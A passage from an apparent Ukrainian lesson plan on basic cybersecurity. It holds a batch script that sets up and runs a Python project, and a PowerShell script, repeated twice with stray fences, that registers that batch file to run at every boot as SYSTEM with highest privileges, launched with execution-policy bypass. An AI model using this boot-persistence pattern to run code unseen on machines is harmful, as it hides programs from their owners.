REM CREATE VENV AND RUN PROJECT  REM Початок секції створення віртуального середовища і запуску проєкту.
REM =========================  REM Візуальний розділювач секції.
call :log "Step: create venv, install dependencies, run project"  REM Записує в лог поточний етап роботи.

pushd "%PROJECT_DIR%" || call :fail "Cannot enter project directory"  REM Переходить у папку проєкту або завершує скрипт з помилкою.

if not exist "%VENV_DIR%\Scripts\python.exe" (  REM Перевіряє, чи ще не створене віртуальне середовище.
  call :log "Creating virtual environment"  REM Записує в лог, що створюється віртуальне середовище.
  %PY_CMD% -m venv "%VENV_DIR%" >> "%LOG_FILE%" 2>&1  REM Створює віртуальне середовище Python у папці .venv.
  if errorlevel 1 call :fail "venv creation failed"  REM Якщо створення venv завершилось з помилкою, викликає обробник помилки.
) else (  REM Якщо віртуальне середовище вже існує, нове не створюється.
  call :log "venv already exists"  REM Записує в лог, що venv уже існує.
)  REM Завершує блок перевірки або створення venv.

call "%VENV_DIR%\Scripts\activate.bat" >> "%LOG_FILE%" 2>&1  REM Активує віртуальне середовище Python.
if errorlevel 1 call :fail "venv activation failed"  REM Якщо активація venv завершилась з помилкою, викликає обробник помилки.

python -m pip install --upgrade pip setuptools wheel >> "%LOG_FILE%" 2>&1  REM Оновлює pip, setuptools і wheel у віртуальному середовищі.
if errorlevel 1 call :fail "pip upgrade failed"  REM Якщо оновлення pip або пакетів завершилось з помилкою, викликає обробник помилки.

if exist "requirements.txt" (  REM Перевіряє, чи є файл requirements.txt із залежностями.
  call :log "Installing requirements.txt"  REM Записує в лог, що встановлюються залежності з requirements.txt.
  pip install -r requirements.txt >> "%LOG_FILE%" 2>&1  REM Встановлює всі бібліотеки з requirements.txt.
  if errorlevel 1 call :fail "requirements install failed"  REM Якщо встановлення залежностей завершилось з помилкою, викликає обробник помилки.
) else if exist "pyproject.toml" (  REM Якщо requirements.txt немає, перевіряє наявність pyproject.toml.
  call :log "Installing pyproject.toml project"  REM Записує в лог, що встановлюється проєкт через pyproject.toml.
  pip install . >> "%LOG_FILE%" 2>&1  REM Встановлює поточний Python проєкт як пакет.
  if errorlevel 1 call :fail "project install failed"  REM Якщо встановлення проєкту завершилось з помилкою, викликає обробник помилки.
) else (  REM Якщо не знайдено ні requirements.txt, ні pyproject.toml.
  call :log "No requirements.txt or pyproject.toml found"  REM Записує в лог, що файлів залежностей не знайдено.
)  REM Завершує блок встановлення залежностей.

if not exist "%ENTRYPOINT%" call :fail "Entry file not found: %ENTRYPOINT%"  REM Перевіряє наявність головного Python файлу і завершує скрипт з помилкою, якщо його немає.

call :log "Running project"  REM Записує в лог, що починається запуск проєкту.
python "%ENTRYPOINT%" >> "%LOG_FILE%" 2>&1  REM Запускає головний Python файл і записує результат у лог.
if errorlevel 1 call :fail "project run failed"  REM Якщо запуск проєкту завершився з помилкою, викликає обробник помилки.

popd  REM Повертається з папки проєкту до попередньої папки.
call :log "Setup finished OK"  REM Записує в лог, що налаштування завершилось успішно.
echo OK. Done.  REM Виводить у консоль повідомлення про успішне завершення.
pause  REM Залишає вікно консолі відкритим, поки користувач не натисне клавішу.
exit /b 0  REM Завершує bat файл із кодом успіху 0.

REM =========================  REM Візуальний розділювач секції.
REM FUNCTIONS  REM Початок секції допоміжних функцій.
REM =========================  REM Візуальний розділювач секції.
:log  REM Мітка функції логування.
>> "%LOG_FILE%" echo [%DATE% %TIME%] %*  REM Додає повідомлення з датою і часом у файл логів.
echo %*  REM Виводить це саме повідомлення у консоль.
exit /b 0  REM Повертається з функції логування з кодом успіху.

:fail  REM Мітка функції обробки помилок.
call :log "ERROR: %*"  REM Записує текст помилки у лог і консоль через функцію log.
echo.  REM Виводить порожній рядок у консоль.
echo ERROR: %*  REM Виводить повідомлення про помилку у консоль.
echo See log: %LOG_FILE%  REM Показує шлях до файлу логів, де можна подивитися деталі.
echo.  REM Виводить порожній рядок у консоль.
pause  REM Залишає вікно консолі відкритим, щоб користувач побачив помилку.
exit /b 1  REM Завершує bat файл із кодом помилки 1.```

### Автозапуск з комп'ютером

це безпечний автозапуск, законний, який запускає вказаний файл

формат файлу .ps1

### Пошук bat файлу

```powershell
$baseDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$batPath = Join-Path $baseDir "setup.bat"
```

Скрипт бере папку, де лежить сам PowerShell файл, і шукає поруч `setup.bat`.

### Перевірка існування setup.bat

```powershell
if (-not (Test-Path $batPath)) {
  Write-Host "ERROR: setup.bat not found at: $batPath"
  exit 1
}
```

Якщо `setup.bat` не знайдено, задача не створюється. Це краще, ніж додати в планувальник неправильний шлях.

### Команда для планувальника

```powershell
$taskRun = "cmd.exe /c `"cd /d `"$baseDir`" && `"$batPath`" >> `"$logPath`" 2>&1`""
```

Це команда, яку буде запускати планувальник. Вона переходить у папку зі скриптом, запускає `setup.bat`, а весь вивід записує в `startup_task_log.txt`.

### Створення задачі

```powershell
schtasks.exe /Create /TN $taskName /SC ONSTART /RU SYSTEM /RL HIGHEST /DELAY 0001:00 /TR $taskRun /F
```

Це створює задачу, яка запускається після старту Windows. `SYSTEM` дозволяє запускати її без входу користувача в акаунт. Затримка 1 хвилина потрібна, щоб система встигла підняти мережу.

Повний код:

```powershell
# add_startup_task_win8.ps1
# Run PowerShell as Administrator.
# This script adds setup.bat to Windows Task Scheduler and runs it after every Windows startup.

$ErrorActionPreference = "Stop"

$taskName = "RunProjectSetupOnBoot"
$baseDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$batPath = Join-Path $baseDir "setup.bat"
$logPath = Join-Path $baseDir "startup_task_log.txt"

Write-Host "Task name: $taskName"
Write-Host "Base directory: $baseDir"
Write-Host "BAT path: $batPath"
Write-Host "Log path: $logPath"

if (-not (Test-Path $batPath)) {
  Write-Host "ERROR: setup.bat not found at: $batPath"
  exit 1
}

$taskRun = "cmd.exe /c `"cd /d `"$baseDir`" && `"$batPath`" >> `"$logPath`" 2>&1`""

Write-Host "Checking existing task..."

schtasks.exe /Query /TN $taskName *> $null

if ($LASTEXITCODE -eq 0) {
  Write-Host "Existing task found. Deleting old task..."
  schtasks.exe /Delete /TN $taskName /F | Out-Null

  if ($LASTEXITCODE -ne 0) {
    Write-Host "ERROR: failed to delete old task."
    exit 1
  }
}

Write-Host "Creating startup task..."

schtasks.exe /Create /TN $taskName /SC ONSTART /RU SYSTEM /RL HIGHEST /DELAY 0001:00 /TR $taskRun /F | Out-Null

if ($LASTEXITCODE -ne 0) {
  Write-Host "ERROR: failed to create scheduled task."
  exit 1
}

Write-Host "OK: Task '$taskName' created."
Write-Host "It will run setup.bat after every Windows startup."
Write-Host "Startup log: $logPath"
```

Запускати треба від адміністратора:

```powershell
powershell -ExecutionPolicy Bypass -File .\add_startup_task_win8.ps1
```

І ще корисний скрипт для видалення задачі:

```powershell
# remove_startup_task_win8.ps1
# Run PowerShell as Administrator.

$taskName = "RunProjectSetupOnBoot"

schtasks.exe /Query /TN $taskName *> $null

if ($LASTEXITCODE -ne 0) {
  Write-Host "Task not found: $taskName"
  exit 0
}

schtasks.exe /Delete /TN $taskName /F | Out-Null

if ($LASTEXITCODE -ne 0) {
  Write-Host "ERROR: failed to delete task."
  exit 1
}

Write-Host "OK: Task '$taskName' deleted."
```

Ось повний PowerShell скрипт для Windows 8, який додає `setup.bat` у планувальник задач для запуску після кожного старту Windows.

```powershell
$ErrorActionPreference = "Stop" # Зупиняє виконання скрипта при першій помилці.

$taskName = "RunProjectSetupOnBoot" # Задає назву задачі у Windows Task Scheduler.
$baseDir = Split-Path -Parent $MyInvocation.MyCommand.Path # Отримує папку, у якій знаходиться цей PowerShell скрипт.
$batPath = Join-Path $baseDir "setup.bat" # Формує повний шлях до файлу setup.bat у цій самій папці.
$logPath = Join-Path $baseDir "startup_task_log.txt" # Формує повний шлях до лог файлу запуску.

Write-Host "Task name: $taskName" # Виводить назву задачі в консоль.
Write-Host "Base directory: $baseDir" # Виводить шлях до базової папки.
Write-Host "BAT path: $batPath" # Виводить шлях до setup.bat.
Write-Host "Log path: $logPath" # Виводить шлях до лог файлу.

if (-not (Test-Path $batPath)) { # Перевіряє, чи існує файл setup.bat.
  Write-Host "ERROR: setup.bat not found at: $batPath" # Виводить помилку, якщо setup.bat не знайдено.
  exit 1 # Завершує скрипт з кодом помилки.
}

$taskRun = "cmd.exe /c `"cd /d `"$baseDir`" && `"$batPath`" >> `"$logPath`" 2>&1`"" # Формує команду, яка переходить у папку скрипта, запускає setup.bat і записує результат у лог.

Write-Host "Checking existing task..." # Повідомляє, що починається перевірка наявної задачі.

schtasks.exe /Query /TN $taskName *> $null # Перевіряє, чи вже існує задача з такою назвою, і приховує вивід.

if ($LASTEXITCODE -eq 0) { # Якщо код виконання дорівнює 0, задача вже існує.
  Write-Host "Existing task found. Deleting old task..." # Повідомляє, що стара задача буде видалена.
  schtasks.exe /Delete /TN $taskName /F | Out-Null # Видаляє стару задачу без додаткового підтвердження.

  if ($LASTEXITCODE -ne 0) { # Перевіряє, чи сталася помилка під час видалення задачі.
    Write-Host "ERROR: failed to delete old task." # Виводить повідомлення про помилку видалення.
    exit 1 # Завершує скрипт з кодом помилки.
  }
}

Write-Host "Creating startup task..." # Повідомляє, що починається створення нової задачі.

schtasks.exe /Create /TN $taskName /SC ONSTART /RU SYSTEM /RL HIGHEST /DELAY 0001:00 /TR $taskRun /F | Out-Null # Створює задачу, яка запускається при старті Windows від імені SYSTEM з найвищими правами через 1 хвилину після запуску системи.

if ($LASTEXITCODE -ne 0) { # Перевіряє, чи сталася помилка під час створення задачі.
  Write-Host "ERROR: failed to create scheduled task." # Виводить повідомлення про помилку створення задачі.
  exit 1 # Завершує скрипт з кодом помилки.
}

Write-Host "OK: Task '$taskName' created." # Повідомляє, що задача успішно створена.
Write-Host "It will run setup.bat after every Windows startup." # Повідомляє, що setup.bat буде запускатися після кожного старту Windows.
Write-Host "Startup log: $logPath" # Виводить шлях до лог файлу, куди буде записано результат запуску.```
```

Запуск від адміністратора:

```powershell
powershell -ExecutionPolicy Bypass -File .\add_startup_task_win8.ps1
```

## Питання до студентів під час заняття

Щоб підтримувати діалог протягом усього уроку, можна використовувати такі запитання:

- Чому люди досі відкривають підозрілі вкладення?
- Який тип атаки найважче помітити одразу?
- Чому відкритий Wi‑Fi може бути небезпечним?
- Чим відрізняється фішинг від вірусу?
- Чому один і той самий пароль на різних сайтах - це ризик?
- Які ознаки підробленого сайта можна помітити без спеціальних інструментів?

## Блок перевірки засвоєння

Орієнтовний час: 10-15 хв

Наприкінці заняття важливо не просто сказати "усім усе зрозуміло?", а поставити конкретні запитання:

- Що нового ви сьогодні дізналися?
- Чим троян відрізняється від вірусу?
- Що таке `Man-in-the-Middle` своїми словами?
- Які три ознаки фішингу ви тепер точно зможете впізнати?
- Які дії треба виконати, якщо виникла підозра на зараження пристрою?

Можна провести короткий усний квіз або мінітест на 5 запитань.

## Підсумок заняття

Кібербезпека - це не лише про антивірус. Це насамперед про уважність, критичне мислення, звичку перевіряти джерела, обережність із файлами та посиланнями, грамотну роботу з паролями і розуміння того, як діють сучасні загрози.

Студенти мають піти з уроку з чіткою думкою: найбільша частина захисту залежить не від складних програм, а від щоденних рішень користувача.

## Домашнє завдання

### Варіант домашнього завдання

Підготувати короткий матеріал на тему "Одна кіберзагроза та як від неї захиститися".

Формат на вибір:

- 1 сторінка тексту;
- 5-7 слайдів;
- коротка інфографіка;
- таблиця "загроза - ознаки - наслідки - захист".

### Вимоги до виконання

- обрати одну загрозу: фішинг, ransomware, spyware, `Man-in-the-Middle`, витік даних, троян або іншу;
- пояснити її простими словами;
- навести приклад із життя або новин;
- описати мінімум 3 способи захисту;
- оформити акуратно та зрозуміло.

### Дедлайн

Дедлайн викладач озвучує наприкінці заняття та дублює в `logbook`.

## Анонс наступного заняття

На наступному занятті можна продовжити тему й перейти до безпечної практики:

- фішинг і розбір підроблених сторінок;
- цифрові сліди та захист акаунтів;
- двофакторна автентифікація;
- безпечні паролі та менеджери паролів;
- базова перевірка підозрілих повідомлень і сайтів.

## Нотатки для викладача під чекліст

Щоб заняття добре відповідало критеріям оцінювання, важливо:

- почати вчасно та відмітити присутніх у перші 15 хвилин;
- з перших хвилин озвучити тему, мету і практичну користь уроку;
- нагадати про камери спокійно і без тиску;
- не читати матеріал із слайдів, а пояснювати своїми словами;
- будувати урок через короткі блоки по 10-20 хв і чергувати пояснення з питаннями або кейсами;
- звертатися не лише до активних студентів, а й залучати тих, хто мовчить;
- під час практики просити відповідати голосом, у чаті або демонструвати результат;
- наприкінці зробити підсумок, поставити питання на перевірку засвоєння і чітко пояснити домашнє завдання.

## Короткий висновок

Цей урок побудований так, щоб одночасно:

- дати зрозумілу теорію;
- показати зв'язок із реальним життям;
- підтримувати постійний діалог зі студентами;
- дати безпечну практику;
- відповідати формату перевірки навчального заняття.
